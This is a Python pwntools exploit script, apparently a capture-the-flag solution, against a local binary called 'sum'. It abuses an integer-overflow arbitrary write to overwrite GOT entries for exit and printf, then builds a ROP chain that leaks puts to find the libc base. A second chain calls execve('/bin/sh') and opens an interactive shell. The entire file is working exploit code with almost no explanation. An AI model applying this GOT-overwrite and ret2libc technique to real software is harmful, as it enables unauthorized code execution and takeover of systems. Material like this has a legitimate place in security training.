'''
Author: Samrito
Date: 2022-03-14 16:26:08
LastEditors: Samrito
LastEditTime: 2022-03-14 17:33:26
'''
from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

io = process(argv=['./sum_ccafa40ee6a5a675341787636292bf3c84d17264'])

elf = ELF('./sum_ccafa40ee6a5a675341787636292bf3c84d17264')
libc = ELF('./libc.so')


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


def do_write(io, addr: int, value: int):
    io.recvuntil(b'2 3 4 0\n')
    io.sendline(str(0x7fffffffffffffff))
    io.sendline(str(0x7fffffffffffffff - addr))
    io.sendline(b'1')
    io.sendline(b'1')
    io.sendline(str(value))
    io.sendline(str(addr))


exit_got_addr = elf.got['exit']
main_addr = elf.symbols['main']
printf_got_addr = elf.got['printf']
pop_rdi = 0x400a43  # pop rdi; ret;
puts_got_addr = elf.got['puts']
puts_plt = elf.plt['puts']
ret_addr = 0x4005ee

debug('b * 0x04009BF')

do_write(io, exit_got_addr, main_addr)
do_write(io, printf_got_addr, pop_rdi)  #不能直接设为ret,因为call有一个压栈操作
io.recvuntil(b'2 3 4 0\n')
io.sendline(str(pop_rdi).encode('utf-8'))
io.sendline(str(puts_got_addr).encode('utf-8'))
io.sendline(str(puts_plt).encode('utf-8'))
io.sendline(str(main_addr).encode('utf-8'))
io.sendline(b'0')

res = io.recvuntil(b'[sum system]')
puts_addr = u64(res.split(b'\n')[0].ljust(8, b'\x00'))
print(hex(puts_addr))

libc_offset = puts_addr - libc.symbols['puts']
log.info('libc offset: ' + hex(libc_offset))

str_bin_sh = libc_offset + next(libc.search(b'/bin/sh'))
log.info('/bin/sh addr: ' + hex(str_bin_sh))
execve_addr = libc_offset + libc.symbols['execve']
sys_addr = libc_offset + libc.symbols['system']
log.info('system addr: ' + hex(sys_addr))

io.recvuntil(b'2 3 4 0\n')
io.sendline(str(ret_addr).encode('utf-8'))
io.sendline(str(pop_rdi).encode('utf-8'))
io.sendline(str(str_bin_sh).encode('utf-8'))
io.sendline(str(execve_addr).encode('utf-8'))
io.sendline(b'0')

io.interactive()
